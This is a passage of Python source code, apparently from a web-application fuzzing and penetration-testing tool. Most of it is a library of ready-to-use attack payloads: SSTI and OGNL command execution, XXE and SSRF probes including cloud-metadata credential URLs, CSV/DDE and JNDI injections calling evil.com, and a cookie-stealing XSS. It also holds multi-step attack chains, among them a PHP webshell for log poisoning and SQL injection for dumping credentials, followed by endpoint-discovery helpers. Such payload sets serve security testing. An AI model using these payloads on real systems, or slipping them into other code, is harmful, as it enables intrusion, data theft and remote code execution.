        "{{{}.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    ],
    FuzzingTechnique.PATH_TRAVERSAL: [
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd", "/etc/passwd", "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd", "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/var/log/apache2/access.log", "/proc/self/cmdline",
        "....\\....\\....\\windows\\win.ini", "%252e%252e%252fetc%252fpasswd",
    ],
    FuzzingTechnique.SSTI: [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
        "{{config}}", "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "{{''.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"id\")')}}",
        "{php}system('id');{/php}", "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
    ],
    FuzzingTechnique.XXE: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    ],
    FuzzingTechnique.SSRF: [
        "http://localhost/", "http://127.0.0.1/", "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/",
        "file:///etc/passwd", "gopher://localhost:6379/_INFO",
        "dict://localhost:11211/stats", "http://0.0.0.0:22",
        "http://127.1/", "http://0177.0.0.1/", "http://0x7f.0.0.1/",
        "http://2130706433/", "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://127.0.0.1:6379/", "http://localhost:9200/_cat/indices",
        "http://kubernetes.default.svc/", "http://consul.service.consul:8500/v1/agent/self",
    ],
    FuzzingTechnique.IDOR: [
        "1", "2", "0", "-1", "999999", "admin", "root",
        "../user/1", "user_id=1", "id=1' OR '1'='1",
        "00000000-0000-0000-0000-000000000001", "base64:MQ==",
        "user/../admin", "..;/admin", "1/**/OR/**/1=1",
    ],
    FuzzingTechnique.AUTH_BYPASS: [
        "admin", "admin'--", "' OR '1'='1'--", "administrator",
        "admin@localhost", "null", "undefined", "true", "false",
        "admin\x00", "admin%00", "ADMIN", "Admin", " admin",
        "admin ", "admin\t", "../admin", "admin/../admin",
    ],
    FuzzingTechnique.HEADER_INJECTION: [
        "test\r\nX-Injected: true", "test\r\n\r\n<html>",
        "test%0d%0aX-Injected:%20true", "test\nSet-Cookie: admin=true",
        "test\r\nLocation: http://evil.com", "test%0aSet-Cookie:%20session=hacked",
    ],
    FuzzingTechnique.PARAMETER_POLLUTION: [
        "value1&param=value2", "value1,value2", "value1%00value2",
        "value1\nvalue2", "[value1,value2]", "{'key':'value'}",
        "value1;value2", "param[]=value1&param[]=value2",
    ],
    # NoSQL Injection
    FuzzingTechnique.NOSQL_INJECTION: [
        '{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}',
        '{"$where": "sleep(5000)"}', '{"$or": [{"a": 1}, {"b": 2}]}',
        "admin'||'1'=='1", '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"$and": [{"password": {"$regex": "^a"}}]}',
        "'; return this.password; var x='", '{"$lookup": {"from": "users"}}',
    ],
    # LDAP Injection
    FuzzingTechnique.LDAP_INJECTION: [
        "*", "*)(&", "*)(uid=*))(|(uid=*", "admin)(&)",
        "x)(|(cn=*)", "*)(objectClass=*)", "admin))(|(password=*",
        "*()|&'", "x'))(|(objectClass=*)", "*)%00",
    ],
    # XPath Injection
    FuzzingTechnique.XPATH_INJECTION: [
        "' or '1'='1", "' or ''='", "x' or name()='username' or 'x'='y",
        "admin' or '1'='1' or 'a'='a", "' or 1=1 or ''='",
        "x']|//user[name/text()='admin", "' or count(/*)=1 or 'a'='b",
    ],
    # CRLF Injection
    FuzzingTechnique.CRLF_INJECTION: [
        "%0d%0aSet-Cookie:crlf=injection", "%0d%0aContent-Length:35%0d%0a%0d%0a<html>",
        "\r\nX-Injected:header", "%0d%0aLocation:%20http://evil.com",
        "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",  # UTF-8 encoded
    ],
    # Host Header Injection
    FuzzingTechnique.HOST_HEADER_INJECTION: [
        "evil.com", "evil.com:80@legitimate.com", "legitimate.com@evil.com",
        "localhost", "127.0.0.1", "evil.com#@legitimate.com",
        "legitimate.com\tevil.com", "legitimate.com evil.com",
    ],
    # Email Injection
    FuzzingTechnique.EMAIL_INJECTION: [
        "test@test.com%0Acc:attacker@evil.com", "test@test.com\nBcc:attacker@evil.com",
        "test@test.com\r\nSubject:Hacked", "\"test\\\"@evil.com\"@legitimate.com",
    ],
    # CSV Injection
    FuzzingTechnique.CSV_INJECTION: [
        "=cmd|'/C calc'!A1", "+cmd|'/C calc'!A1", "-cmd|'/C calc'!A1",
        "@SUM(1+1)*cmd|'/C calc'!A1", "=HYPERLINK(\"http://evil.com\",\"Click\")",
        "=DDE(\"cmd\";\"/C calc\";\"__DdesystemCOMMAND\")",
    ],
    # Log Injection
    FuzzingTechnique.LOG_INJECTION: [
        "test\n[ERROR] Fake error message", "test%0a[INFO] Injected log",
        "${jndi:ldap://evil.com/a}", "{{7*7}}", "${7*7}",
    ],
    # GraphQL
    FuzzingTechnique.GRAPHQL: [
        "{__schema{types{name}}}", "{__type(name:\"Query\"){fields{name}}}",
        "query{__typename}", "{users{id,email,password}}",
        "mutation{updateUser(id:1,role:\"admin\"){id}}", "{user(id:\"1 OR 1=1\"){id}}",
        "[{\"query\":\"{a}\"},{\"query\":\"{b}\"}]",  # Batching
    ],
    # WebSocket
    FuzzingTechnique.WEBSOCKET: [
        "{\"type\":\"subscribe\",\"channel\":\"admin\"}", "<script>alert(1)</script>",
        "'; DROP TABLE users;--", "{\"__proto__\":{\"polluted\":true}}",
    ],
    # Open Redirect
    FuzzingTechnique.OPEN_REDIRECT: [
        "//evil.com", "https://evil.com", "/\\evil.com", "//evil.com/%2f..",
        "////evil.com", "https:evil.com", "http://evil.com\\@legitimate.com",
        "\\.evil.com", "///evil.com/%2f..", "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    # Mass Assignment
    FuzzingTechnique.MASS_ASSIGNMENT: [
        '{"role":"admin"}', '{"isAdmin":true}', '{"is_verified":true}',
        '{"permissions":["*"]}', '{"user_type":"administrator"}',
        '{"balance":99999999}', '{"price":0}', '{"discount":100}',
    ],
    # Prototype Pollution
    FuzzingTechnique.PROTOTYPE_POLLUTION: [
        '{"__proto__":{"polluted":true}}', '{"constructor":{"prototype":{"polluted":true}}}',
        '{"__proto__":{"isAdmin":true}}', '{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect"}}',
        '[{"__proto__":{"length":100000000}}]', '{"__proto__":{"status":500}}',
    ],
    # Cache Poisoning
    FuzzingTechnique.CACHE_POISONING: [
        "X-Forwarded-Host: evil.com", "X-Forwarded-Scheme: nothttps",
        "X-Original-URL: /admin", "X-Rewrite-URL: /admin",
        "X-Forwarded-Port: 443\", \"X-Forwarded-Port\": \"443",
    ],
    # File Upload
    FuzzingTechnique.FILE_UPLOAD: [
        "shell.php", "shell.php.jpg", "shell.pHp", "shell.php%00.jpg",
        "shell.php;.jpg", "shell.php::$DATA", "..;/shell.php",
        ".htaccess", "shell.phtml", "shell.php5", "shell.shtml",
    ],
    # Insecure Deserialization
    FuzzingTechnique.INSECURE_DESERIALIZATION: [
        'O:8:"stdClass":0:{}',  # PHP
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',  # Java (base64)
        'gASVIAAAAAAAAACMCF9fbWFpbl9flIwEVGVzdJSTlCmBlH0UjAR0ZXN0lIwFdmFsdWWUc2Iu',  # Python pickle
    ],
    # Java Deserialization
    FuzzingTechnique.JAVA_DESERIALIZATION: [
        'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
        'aced0005', 'H4sIAAAAAAAAAJVSTW',  # Base64/Gzip encoded
    ],
    # Cloud Metadata
    FuzzingTechnique.CLOUD_METADATA: [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",  # DigitalOcean
        "http://100.100.100.200/latest/meta-data/",  # Alibaba
    ],
    # Padding Oracle
    FuzzingTechnique.PADDING_ORACLE: [
        "AAAAAAAAAAAAAAAA", "AAAAAAAAAAAAAAAB", 
        # These need to be generated dynamically based on ciphertext
    ],
    # OAuth Attacks
    FuzzingTechnique.OAUTH_ATTACK: [
        "redirect_uri=https://evil.com", "redirect_uri=//evil.com",
        "redirect_uri=https://legitimate.com.evil.com",
        "client_id=admin", "scope=admin:write",
        "state=", "response_type=token",
    ],
    # SAML Attacks
    FuzzingTechnique.SAML_ATTACK: [
        '<!--', '-->',  # Comment injection
        '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd">',
        'xmlns:xsl="http://www.w3.org/1999/XSL/Transform"',
    ],
    # Expression Language Injection
    FuzzingTechnique.EXPRESSION_LANGUAGE_INJECTION: [
        "${7*7}", "#{7*7}", "${applicationScope}", "${header}",
        "${pageContext.request.serverName}",
    ],
    # OGNL Injection
    FuzzingTechnique.OGNL_INJECTION: [
        "%{(#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id'))}",
        "(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))",
    ],
    # SpEL Injection
    FuzzingTechnique.SPEL_INJECTION: [
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "${7*7}", "#{7*7}",
    ],
    # Debug Endpoints
    FuzzingTechnique.DEBUG_ENDPOINTS: [
        "/debug", "/console", "/actuator", "/actuator/health",
        "/actuator/env", "/metrics", "/trace", "/.env",
        "/phpinfo.php", "/server-status", "/elmah.axd",
        "/swagger.json", "/api-docs", "/graphql/playground",
    ],
    # Default Credentials
    FuzzingTechnique.DEFAULT_CREDENTIALS: [
        "admin:admin", "admin:password", "root:root", "admin:123456",
        "test:test", "user:user", "guest:guest", "admin:admin123",
        "tomcat:tomcat", "manager:manager", "postgres:postgres",
    ],
    # Subdomain Takeover
    FuzzingTechnique.SUBDOMAIN_TAKEOVER: [
        "CNAME",  # Marker payloads are used differently
    ],
    # Timing Attack
    FuzzingTechnique.TIMING_ATTACK: [
        "a", "aa", "aaa", "aaaa", "aaaaa",  # Compare response times
    ],
    # BOLA (Broken Object Level Authorization)
    FuzzingTechnique.BOLA: [
        "1", "2", "0", "999999", "admin", "00000000-0000-0000-0000-000000000001",
        "../user/admin", "1;--", "1' OR '1'='1",
    ],
    # BFLA (Broken Function Level Authorization)
    FuzzingTechnique.BFLA: [
        "admin", "DELETE", "PUT", "PATCH", 
        "/admin/users", "/api/admin", "/internal/",
    ],
    # C2 Detection
    FuzzingTechnique.C2_DETECTION: [
        "beacon", "callback", "checkin", "meterpreter", "empire",
        "cobalt strike", "sliver", "dns tunnel", "http c2",
    ],
    FuzzingTechnique.MALWARE_ANALYSIS: [
        "mimikatz", "CreateRemoteThread", "VirtualAllocEx", "HKLM\\Run",
        "schtasks /create", "process injection", "credential dump",
    ],
    FuzzingTechnique.EVASION_TESTING: [
        "vmware", "virtualbox", "sandbox", "IsDebuggerPresent",
        "GetTickCount", "sleep(60000)", "anti-analysis",
    ],
    # DOM Clobbering
    FuzzingTechnique.DOM_CLOBBERING: [
        '<form id="x"><input id="y"></form>',
        '<img name="getElementById">',
        '<a id="x"><a id="x" name="y" href="data:,payload">',
    ],
    # CSS Injection
    FuzzingTechnique.CSS_INJECTION: [
        "}</style><script>alert(1)</script>",
        "background:url(http://evil.com/?",
        "input[value^='a']{background:url(http://evil.com/?a)}",
    ],
    # Clickjacking
    FuzzingTechnique.CLICKJACKING: [
        "<iframe>",  # Used to detect missing X-Frame-Options
    ],
    # PostMessage Exploit
    FuzzingTechnique.POSTMESSAGE_EXPLOIT: [
        '{"type":"cmd","data":"alert(1)"}',
        '{"__proto__":{"isAdmin":true}}',
    ],
}

# Blind detection payloads - require time measurement or OOB callbacks
BLIND_PAYLOADS = {
    "sql_injection_time": [
        "' AND SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5);--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND BENCHMARK(5000000,MD5('test'))--",
        "'; SELECT pg_sleep(5);--",
        "' || pg_sleep(5)--",
    ],
    "command_injection_time": [
        "; sleep 5",
        "| sleep 5",
        "& ping -n 5 127.0.0.1 &",
        "| timeout 5",
        "`sleep 5`",
        "$(sleep 5)",
    ],
    "xxe_oob": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}/xxe"> %xxe;]><foo>test</foo>',
    ],
    "ssrf_oob": [
        "http://{callback}/ssrf",
        "https://{callback}/ssrf",
        "http://{callback}/?url=internal",
        "gopher://{callback}:80/_GET%20/ssrf",
    ],
    "ssti_time": [
        "{{range.constructor(\"return this\")().constructor(\"var d=new Date();while(new Date()-d<5000)\")()}}",
        "${T(java.lang.Thread).sleep(5000)}",
        "<%= java.lang.Thread.sleep(5000) %>",
    ],
}

# Attack chain templates for multi-step exploitation
ATTACK_CHAIN_TEMPLATES = {
    "ssrf_to_rce": {
        "name": "SSRF to RCE via Internal Services",
        "description": "Chain SSRF to access internal services, then exploit for RCE",
        "steps": [
            {"technique": "ssrf", "payload": "http://127.0.0.1:{port}/", "expected": "internal_access"},
            {"technique": "ssrf", "payload": "http://169.254.169.254/latest/meta-data/", "expected": "cloud_metadata"},
            {"technique": "command_injection", "payload": "; id", "expected": "command_execution"},
        ],
    },
    "sqli_to_data_exfil": {
        "name": "SQL Injection to Data Exfiltration",
        "description": "Chain SQL injection to extract sensitive data",
        "steps": [
            {"technique": "sql_injection", "payload": "' ORDER BY 1--", "expected": "column_count"},
            {"technique": "sql_injection", "payload": "' UNION SELECT NULL,table_name FROM information_schema.tables--", "expected": "table_names"},
            {"technique": "sql_injection", "payload": "' UNION SELECT NULL,column_name FROM information_schema.columns--", "expected": "column_names"},
            {"technique": "sql_injection", "payload": "' UNION SELECT username,password FROM users--", "expected": "credentials"},
        ],
    },
    "lfi_to_rce": {
        "name": "LFI to RCE via Log Poisoning",
        "description": "Chain LFI to read logs, poison with PHP, then execute",
        "steps": [
            {"technique": "path_traversal", "payload": "../../../var/log/apache2/access.log", "expected": "log_access"},
            {"technique": "header_injection", "payload": "<?php system($_GET['cmd']); ?>", "expected": "log_poisoning"},
            {"technique": "path_traversal", "payload": "../../../var/log/apache2/access.log&cmd=id", "expected": "rce"},
        ],
    },
    "xxe_to_ssrf": {
        "name": "XXE to SSRF Internal Scanning",
        "description": "Use XXE to perform SSRF and scan internal network",
        "steps": [
            {"technique": "xxe", "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>', "expected": "xxe_confirmed"},
            {"technique": "xxe", "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/">]>', "expected": "internal_scan"},
            {"technique": "xxe", "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', "expected": "file_read"},
        ],
    },
    "auth_bypass_to_admin": {
        "name": "Auth Bypass to Admin Access",
        "description": "Bypass authentication then escalate to admin",
        "steps": [
            {"technique": "auth_bypass", "payload": "admin'--", "expected": "login_bypass"},
            {"technique": "idor", "payload": "user_id=1", "expected": "admin_access"},
            {"technique": "parameter_pollution", "payload": "role=admin&role=user", "expected": "privilege_escalation"},
        ],
    },
    # NEW: HTTP Request Smuggling Chains
    "smuggling_to_cache_poison": {
        "name": "HTTP Smuggling to Cache Poisoning",
        "description": "Use request smuggling to poison web cache with malicious content",
        "steps": [
            {"technique": "http_smuggling", "payload": "CL.TE desync", "expected": "desync_confirmed"},
            {"technique": "http_smuggling", "payload": "Smuggle request to poison cache", "expected": "cache_poisoned"},
            {"technique": "xss", "payload": "<script>alert(document.cookie)</script>", "expected": "stored_xss_via_cache"},
        ],
    },
    "smuggling_to_auth_bypass": {
        "name": "HTTP Smuggling to Authentication Bypass",
        "description": "Smuggle requests to bypass frontend authentication",
        "steps": [
            {"technique": "http_smuggling", "payload": "TE.CL desync", "expected": "desync_confirmed"},
            {"technique": "http_smuggling", "payload": "Smuggle admin request", "expected": "auth_bypassed"},
            {"technique": "idor", "payload": "Access admin endpoints", "expected": "admin_access"},
        ],
    },
    "smuggling_to_request_hijack": {
        "name": "HTTP Smuggling to Request Hijacking",
        "description": "Capture other users' requests via request smuggling",
        "steps": [
            {"technique": "http_smuggling", "payload": "CL.TE prefix injection", "expected": "prefix_injected"},
            {"technique": "http_smuggling", "payload": "Capture subsequent request", "expected": "request_captured"},
            {"technique": "auth_bypass", "payload": "Use captured credentials", "expected": "session_hijack"},
        ],
    },
    # NEW: Race Condition Chains
    "race_to_double_spend": {
        "name": "Race Condition to Double Spend",
        "description": "Exploit race condition to bypass balance checks",
        "steps": [
            {"technique": "race_condition", "payload": "Identify transaction endpoint", "expected": "endpoint_found"},
            {"technique": "race_condition", "payload": "Parallel requests exceeding balance", "expected": "balance_bypass"},
            {"technique": "business_logic", "payload": "Confirm multiple withdrawals", "expected": "double_spend_confirmed"},
        ],
    },
    "race_to_privilege_escalation": {
        "name": "Race Condition to Privilege Escalation",
        "description": "Race signup/role assignment for elevated privileges",
        "steps": [
            {"technique": "race_condition", "payload": "Concurrent signup requests", "expected": "duplicate_account"},
            {"technique": "race_condition", "payload": "Race role assignment", "expected": "role_confusion"},
            {"technique": "auth_bypass", "payload": "Access elevated functions", "expected": "privilege_gained"},
        ],
    },
    "race_to_coupon_abuse": {
        "name": "Race Condition to Coupon/Promo Abuse",
        "description": "Use race condition for unlimited coupon redemption",
        "steps": [
            {"technique": "race_condition", "payload": "Parallel coupon applications", "expected": "multiple_redemptions"},
            {"technique": "business_logic", "payload": "Verify discount stacking", "expected": "discount_bypassed"},
        ],
    },
    # NEW: JWT Attack Chains
    "jwt_to_admin_access": {
        "name": "JWT Exploitation to Admin Access",
        "description": "Exploit JWT vulnerabilities to gain admin privileges",
        "steps": [
            {"technique": "jwt_attack", "payload": "alg:none token", "expected": "signature_bypass"},
            {"technique": "jwt_attack", "payload": "Modify role claim to admin", "expected": "claim_accepted"},
            {"technique": "idor", "payload": "Access admin APIs", "expected": "admin_access"},
        ],
    },
    "jwt_to_account_takeover": {
        "name": "JWT Key Confusion to Account Takeover",
        "description": "Exploit algorithm confusion to forge any user's token",
        "steps": [
            {"technique": "jwt_attack", "payload": "RS256 to HS256 confusion", "expected": "key_confusion"},
            {"technique": "jwt_attack", "payload": "Forge target user token", "expected": "token_forged"},
            {"technique": "auth_bypass", "payload": "Access as target user", "expected": "account_takeover"},
        ],
    },
    # NEW: SSTI Chains
    "ssti_to_rce": {
        "name": "SSTI to Remote Code Execution",
        "description": "Exploit template injection for code execution",
        "steps": [
            {"technique": "ssti", "payload": "{{7*7}}", "expected": "template_execution"},
            {"technique": "ssti", "payload": "{{config.items()}}", "expected": "config_leak"},
            {"technique": "ssti", "payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "expected": "class_enumeration"},
            {"technique": "command_injection", "payload": "{{lipsum.__globals__.os.popen('id').read()}}", "expected": "rce"},
        ],
    },
    "ssti_to_secrets": {
        "name": "SSTI to Secret Exfiltration",
        "description": "Use SSTI to extract environment secrets and API keys",
        "steps": [
            {"technique": "ssti", "payload": "{{config}}", "expected": "config_access"},
            {"technique": "ssti", "payload": "{{request.environ}}", "expected": "env_leak"},
            {"technique": "ssti", "payload": "{{settings.DATABASES}}", "expected": "db_credentials"},
        ],
    },
    # NEW: Prototype Pollution Chains
    "prototype_to_rce": {
        "name": "Prototype Pollution to RCE",
        "description": "Chain prototype pollution to achieve code execution",
        "steps": [
            {"technique": "prototype_pollution", "payload": '{"__proto__":{"test":"value"}}', "expected": "pollution_confirmed"},
            {"technique": "prototype_pollution", "payload": '{"__proto__":{"shell":"/proc/self/exe","env":{"NODE_OPTIONS":"--require /proc/self/cmdline"}}}', "expected": "env_polluted"},
            {"technique": "command_injection", "payload": "Trigger child_process", "expected": "rce"},
        ],
    },
    "prototype_to_xss": {
        "name": "Prototype Pollution to XSS",
        "description": "Use prototype pollution to inject client-side scripts",
        "steps": [
            {"technique": "prototype_pollution", "payload": '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}', "expected": "dom_polluted"},
            {"technique": "xss", "payload": "Trigger DOM render", "expected": "xss_executed"},
        ],
    },
    # NEW: Cache Poisoning Chains
    "cache_poison_to_xss": {
        "name": "Web Cache Poisoning to Stored XSS",
        "description": "Poison cache to serve XSS to all users",
        "steps": [
            {"technique": "cache_poisoning", "payload": "X-Forwarded-Host: evil.com", "expected": "header_reflected"},
            {"technique": "cache_poisoning", "payload": "Cache key manipulation", "expected": "cache_hit"},
            {"technique": "xss", "payload": "<script>document.location='http://evil.com/'+document.cookie</script>", "expected": "mass_xss"},
        ],
    },
    "cache_deception_to_data_theft": {
        "name": "Web Cache Deception to Data Theft",
        "description": "Trick cache into storing sensitive responses",
        "steps": [
            {"technique": "cache_poisoning", "payload": "/account/settings/style.css", "expected": "path_extension_cached"},
            {"technique": "idor", "payload": "Access cached sensitive page", "expected": "data_leaked"},
        ],
    },
    # NEW: CORS Misconfiguration Chains
    "cors_to_data_theft": {
        "name": "CORS Misconfiguration to Data Theft",
        "description": "Exploit CORS to steal authenticated data cross-origin",
        "steps": [
            {"technique": "cors_bypass", "payload": "Origin: https://evil.com", "expected": "origin_reflected"},
            {"technique": "cors_bypass", "payload": "Origin: null", "expected": "null_origin_allowed"},
            {"technique": "xss", "payload": "Cross-origin fetch with credentials", "expected": "data_exfiltrated"},
        ],
    },
    # NEW: Mass Assignment Chains
    "mass_assign_to_admin": {
        "name": "Mass Assignment to Admin Privilege",
        "description": "Add admin role via mass assignment vulnerability",
        "steps": [
            {"technique": "mass_assignment", "payload": '{"role":"admin"}', "expected": "field_accepted"},
            {"technique": "mass_assignment", "payload": '{"is_admin":true,"permissions":["all"]}', "expected": "privilege_elevated"},
            {"technique": "idor", "payload": "Access admin functions", "expected": "admin_access"},
        ],
    },
    # NEW: GraphQL Attack Chains
    "graphql_introspection_to_data": {
        "name": "GraphQL Introspection to Data Exfiltration",
        "description": "Use introspection to discover and extract sensitive data",
        "steps": [
            {"technique": "graphql", "payload": "{__schema{types{name}}}", "expected": "schema_leaked"},
            {"technique": "graphql", "payload": "{__type(name:\"User\"){fields{name}}}", "expected": "fields_discovered"},
            {"technique": "graphql", "payload": "{users{id,email,passwordHash,apiKey}}", "expected": "data_exfiltrated"},
        ],
    },
    "graphql_batching_to_bruteforce": {
        "name": "GraphQL Batching to Authentication Bypass",
        "description": "Use query batching to bypass rate limits and brute force",
        "steps": [
            {"technique": "graphql", "payload": "[{query},{query},...]", "expected": "batching_allowed"},
            {"technique": "auth_bypass", "payload": "Batch 1000 login mutations", "expected": "rate_limit_bypassed"},
            {"technique": "auth_bypass", "payload": "Credential found", "expected": "auth_success"},
        ],
    },
    # NEW: WebSocket Attack Chains
    "websocket_to_csrf": {
        "name": "WebSocket CSRF to Account Actions",
        "description": "Exploit missing WebSocket origin validation for CSRF",
        "steps": [
            {"technique": "websocket", "payload": "Cross-origin WebSocket connect", "expected": "connection_allowed"},
            {"technique": "websocket", "payload": "Send privileged action", "expected": "action_executed"},
        ],
    },
    "websocket_to_injection": {
        "name": "WebSocket Message Injection",
        "description": "Inject malicious commands via WebSocket",
        "steps": [
            {"technique": "websocket", "payload": "Capture WebSocket protocol", "expected": "protocol_understood"},
            {"technique": "command_injection", "payload": "Inject command in message", "expected": "command_executed"},
        ],
    },
    # NEW: Deserialization Chains
    "deserialization_to_rce": {
        "name": "Insecure Deserialization to RCE",
        "description": "Exploit deserialization for code execution",
        "steps": [
            {"technique": "business_logic", "payload": "Identify serialized data", "expected": "serialization_found"},
            {"technique": "command_injection", "payload": "Craft malicious serialized object", "expected": "payload_crafted"},
            {"technique": "command_injection", "payload": "Trigger deserialization", "expected": "rce"},
        ],
    },
    # NEW: Open Redirect Chains
    "open_redirect_to_oauth_theft": {
        "name": "Open Redirect to OAuth Token Theft",
        "description": "Chain open redirect to steal OAuth tokens",
        "steps": [
            {"technique": "business_logic", "payload": "/redirect?url=https://evil.com", "expected": "redirect_confirmed"},
            {"technique": "auth_bypass", "payload": "Use in OAuth redirect_uri", "expected": "oauth_flow_manipulated"},
            {"technique": "auth_bypass", "payload": "Capture access token", "expected": "token_stolen"},
        ],
    },
    "open_redirect_to_phishing": {
        "name": "Open Redirect to Credential Phishing",
        "description": "Use open redirect for convincing phishing",
        "steps": [
            {"technique": "business_logic", "payload": "/redirect?url=https://evil.com/login", "expected": "redirect_works"},
            {"technique": "business_logic", "payload": "Clone login page", "expected": "phishing_page_ready"},
        ],
    },
}


def get_payloads_for_technique(technique: FuzzingTechnique, custom: List[str] = None) -> List[str]:
    """Get payloads for a specific technique."""
    payloads = list(TECHNIQUE_PAYLOADS.get(technique, []))
    if custom:
        payloads.extend(custom)
    return payloads


def get_blind_payloads(technique: str, callback_url: str = "") -> List[str]:
    """Get blind detection payloads for a technique."""
    key = f"{technique}_time" if f"{technique}_time" in BLIND_PAYLOADS else f"{technique}_oob"
    payloads = BLIND_PAYLOADS.get(key, [])
    
    # Replace callback placeholder
    if callback_url:
        payloads = [p.replace("{callback}", callback_url) for p in payloads]
    
    return payloads


# =============================================================================
# AUTO-DISCOVERY FUNCTIONS
# =============================================================================

def discover_endpoints_from_html(html: str, base_url: str) -> List[DiscoveredEndpoint]:
    """Parse HTML to discover endpoints with validation to filter garbage."""
    discovered = []
    
    try:
        parser = EndpointDiscoveryParser()
        parser.feed(html)
        
        # Process links - these are usually reliable
        for link in parser.links:
            url = urllib.parse.urljoin(base_url, link)
            # Extract parameters from URL
            parsed = urllib.parse.urlparse(url)
            params = list(urllib.parse.parse_qs(parsed.query).keys())
            
            endpoint = DiscoveredEndpoint.create_validated(
                url=url.split("?")[0],  # Base URL without params
                method="GET",
                parameters=params,
                source="html_link",
            )
            if endpoint:
                discovered.append(endpoint)
        
        # Process forms - also reliable
        for form in parser.forms:
            action = form.get("action", "")
            url = urllib.parse.urljoin(base_url, action) if action else base_url
            params = [inp["name"] for inp in form.get("inputs", []) if inp.get("name")]
            
            endpoint = DiscoveredEndpoint.create_validated(
                url=url,
                method=form.get("method", "GET"),
                parameters=params,
                source="html_form",
            )
            if endpoint:
                discovered.append(endpoint)
        
        # Process API endpoints from scripts - NEEDS VALIDATION (prone to garbage)
        # api_endpoints now contains tuples of (path, method)
        for api_info in parser.api_endpoints:
            # Handle both old format (string) and new format (tuple)
            if isinstance(api_info, tuple):
                api_path, api_method = api_info
            else:
                api_path = api_info
                api_method = "GET"
            
            url = urllib.parse.urljoin(base_url, api_path)
            endpoint = DiscoveredEndpoint.create_validated(
                url=url,
                method=api_method.upper(),
                source="javascript",
                confidence=0.8,
            )
            if endpoint:
                discovered.append(endpoint)
        
    except Exception as e:
        logger.warning(f"HTML parsing error: {e}")
    
    return discovered


def discover_endpoints_from_json(json_str: str, base_url: str) -> List[DiscoveredEndpoint]:
    """Extract potential endpoints from JSON response."""
    discovered = []
    
    try:
        data = json.loads(json_str)
        urls = extract_urls_from_json(data, base_url)
        
        for url in urls:
            discovered.append(DiscoveredEndpoint(
                url=url,
                method="GET",
                source="json",
                confidence=0.7,
            ))
    except json.JSONDecodeError:
        pass
    
    return discovered


def extract_urls_from_json(obj: Any, base_url: str, depth: int = 0) -> List[str]:
    """Recursively extract URLs from JSON object."""
    urls = []
    if depth > 10:  # Prevent infinite recursion
        return urls
    
    if isinstance(obj, str):
        # Check if it looks like a URL or path
        if obj.startswith(("http://", "https://", "/")):
            url = urllib.parse.urljoin(base_url, obj) if obj.startswith("/") else obj
            urls.append(url)
        elif re.match(r'^/[a-zA-Z0-9_/\-]+$', obj):
            urls.append(urllib.parse.urljoin(base_url, obj))
    
    elif isinstance(obj, dict):
        # Look for URL-like keys
        url_keys = ["url", "href", "link", "endpoint", "path", "uri", "api", "callback"]
        for key, value in obj.items():
            if key.lower() in url_keys and isinstance(value, str):
                url = urllib.parse.urljoin(base_url, value) if value.startswith("/") else value
                if value.startswith(("http://", "https://", "/")):
                    urls.append(url)
            urls.extend(extract_urls_from_json(value, base_url, depth + 1))
    
    elif isinstance(obj, list):
        for item in obj:
            urls.extend(extract_urls_from_json(item, base_url, depth + 1))
